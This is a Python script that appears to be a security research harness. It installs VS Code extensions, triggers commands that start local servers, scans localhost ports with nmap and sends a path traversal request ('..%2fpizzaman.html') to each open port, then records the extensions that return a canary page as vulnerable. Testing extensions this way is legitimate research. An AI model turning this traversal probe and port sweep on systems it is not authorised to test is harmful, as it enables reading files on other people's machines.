import asyncio
import traceback
from pathlib import Path
from typing import List, AnyStr

import nest_asyncio
import pyautogui
import pickle
import time
import json
import requests

from networkmapper.nmap import Nmap
from src.utils.utils import async_for
from src.utils.logman import logger

from src.vsextension.extention import Extension
from src.vsprocess.vsprocess import VSProcess
from vsextension.vsepuller import VSExtensionPuller


KEYWORDS_TO_SEARCH = ["live server", "Latex", "Json", "Open in"]
nest_asyncio.apply()
loop = asyncio.get_event_loop()


def create_key(extension_name: AnyStr) -> AnyStr:
    """Create a key out of extension name"""
    return extension_name.replace(" ", "---").lower()


def save_vulnerable_extension(extension: Extension):
    """Save vulnerable extension in a json file including Key value pairs of publisher,
    extension name, version, short description, published date, last updated, versions
    """
    vuln_path = Path(__file__).parent.joinpath("vulnerable_extensions.json")
    if vuln_path.exists():
        file = open(vuln_path, mode="r")
        data = json.load(file)
        file.close()
        Path(vuln_path).unlink()
    else:
        data = dict()
    new_key = create_key(extension.extension_name)
    if new_key not in data:
        data[new_key] = {
            "publisherName": extension.publisher.publisher_name,
            "extensionName": extension.extension_name,
            "version": extension.version,
            "shortDescription": extension.short_description,
            "publishedDate": extension.published_date,
            "lastUpdated": extension.last_updated,
        }
    file = open("vulnerable_extensions.json", mode="w")
    json.dump(data, file, indent=4)


async def download_extensions(all_extensions: List[Extension]):
    """Download all extensions"""
    tasks = list()
    for extension in all_extensions:
        print(str(extension))
        tasks.append(extension.download())
    await asyncio.gather(*tasks)


async def install_and_unzip_extension(extension: Extension):
    """Install extension in vscode and run tests on it"""
    await extension.install()
    await extension.unzip()


async def uninstall_and_cleanup_extension(extension: Extension):
    """Uninstall extension in vscode and cleanup"""
    await extension.uninstall()
    await extension.cleanup()


async def pull_commands(extension: Extension):
    """Pull commands from package.json from extensions"""
    await extension.pull_commands()


def get_ports():
    """Run nmap using Nmap class and return open ports"""
    nmap = Nmap("localhost")
    loop.run_until_complete(nmap.scan())
    return nmap.open_ports


def test_path_traversal_attack(extension: Extension):
    """Test path traversal attack"""
    ports = get_ports()
    logger.info(
        "Open ports for extension " + extension.extension_name + " are: " + str(ports)
    )

    # Use requests to send a request with different path and check the response
    # If the response is 200 and contain You are under attack by a pizzaman! then the attack is successful
    for port in ports:
        url = f"http://192.168.1.47:{port}/..%2fpizzaman.html"

        payload = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        }

        try:
            response = requests.request("GET", url, headers=headers, data=payload)
            if (
                response.status_code == 200
                and "You are under attack by a pizzaman!" in response.text
            ):
                logger.critical(
                    "Path traversal attack success on port "
                    + str(port)
                    + " for extension "
                    + extension.extension_name
                )
                save_vulnerable_extension(extension)
                break
            else:
                logger.info(
                    "Path traversal attack failed on port "
                    + str(port)
                    + " for extension "
                    + extension.extension_name
                )
        except Exception as e:
            logger.error(
                "Path traversal attack errored on port "
                + str(port)
                + " for extension "
                + extension.extension_name
            )
            logger.error(e, exc_info=True)


def debug_extension(extension: Extension):
    """Run tests on extension"""
    time.sleep(10)

    logger.info(
        "Running tests on extension: "
        + extension.extension_name
        + " by "
        + extension.publisher.publisher_name
    )
    for command in extension.commands:
        command_to_run = f"{command['category']}:" if "category" in command else ""
        command_to_run += f"{command['title']}"
        sneaky_command = [
            "server" in command_to_run.lower(),
            "latex" in command_to_run.lower(),
            "json" in command_to_run.lower(),
            "open in" in command_to_run.lower(),
        ]
        if (
            any(sneaky_command)
            and "build" not in command_to_run.lower()
            and "%" not in command_to_run
        ):
            logger.info("Running command: " + command_to_run)
            pyautogui.click(
                x=200, y=200
            )  # Replace x and y with coordinates inside the VS Code window
            pyautogui.hotkey("command", "shift", "p")
            time.sleep(1)
            pyautogui.typewrite("Go to File...")
            time.sleep(1)
            pyautogui.press("enter")
            time.sleep(1)
            pyautogui.typewrite("index.html")
            time.sleep(1)
            pyautogui.press("enter")
            time.sleep(1)

            pyautogui.hotkey("command", "shift", "p")
            # Allow time for Command Palette to open
            time.sleep(1)
            pyautogui.typewrite(command_to_run)
            time.sleep(1)
            pyautogui.press("enter")
            time.sleep(1)

            # test path_traversal_attack
            test_path_traversal_attack(extension)
            time.sleep(2)

            # open vscode on mac
            pyautogui.hotkey("command", "space")
            pyautogui.typewrite("Visual Studio Code")
            time.sleep(1)
            pyautogui.press("enter")
            time.sleep(2)


async def debug_extensions(all_extensions: List[Extension], vscode_process, limiter):
    """Install all extensions in vscode and run tests on them"""

    async with limiter:
        try:
            # install all extensions
            tasks = list()
            for extension in all_extensions:
                tasks.append(install_and_unzip_extension(extension))
            await asyncio.gather(*tasks)

            # Pull commands from package.json from extensions
            tasks = list()
            for extension in all_extensions:
                tasks.append(pull_commands(extension))
            await asyncio.gather(*tasks)

            # Let extensions install
            await asyncio.sleep(10)

            # start vscode
            await asyncio.gather(vscode_process.start())

            # debug all extensions
            for extension in all_extensions:
                debug_extension(extension)
        finally:
            # uninstall all extensions
            tasks = list()
            for extension in all_extensions:
                tasks.append(uninstall_and_cleanup_extension(extension))
            await asyncio.gather(*tasks)


async def start(_downloaded_extensions: List[Extension]):
    asyncio_semaphore = asyncio.BoundedSemaphore(1)
    vscode_process = VSProcess()

    try:
        jobs = []
        for i in range(len(_downloaded_extensions)):
            jobs.append(
                asyncio.ensure_future(
                    debug_extensions(
                        _downloaded_extensions[i : i + 1],
                        vscode_process,
                        asyncio_semaphore,
                    )
                )
            )
        await asyncio.gather(*jobs)
    finally:
        time.sleep(5)
        await vscode_process.kill()


if __name__ == "__main__":
    # # Pull extensions from marketplace
    # puller = VSExtensionPuller()
    # extensions = asyncio.run(puller.pull(KEYWORDS_TO_SEARCH))
    # asyncio.run(download_extensions(extensions))
    #
    # extension = [ext for ext in extensions if ext.downloaded]
    #
    # # Save extensions to file
    # with open("extensions.pickle", "wb") as f:
    #     pickle.dump(extensions, f)

    # Load extensions from file
    with open("extensions.pickle", "rb") as f:
        downloaded_extensions: List[Extension] = pickle.load(f)

    # Start Vscode sub process and install extensions from downloads folder
    asyncio.run(start(downloaded_extensions[20:40]))  # TODO: Test slow to deal with errors
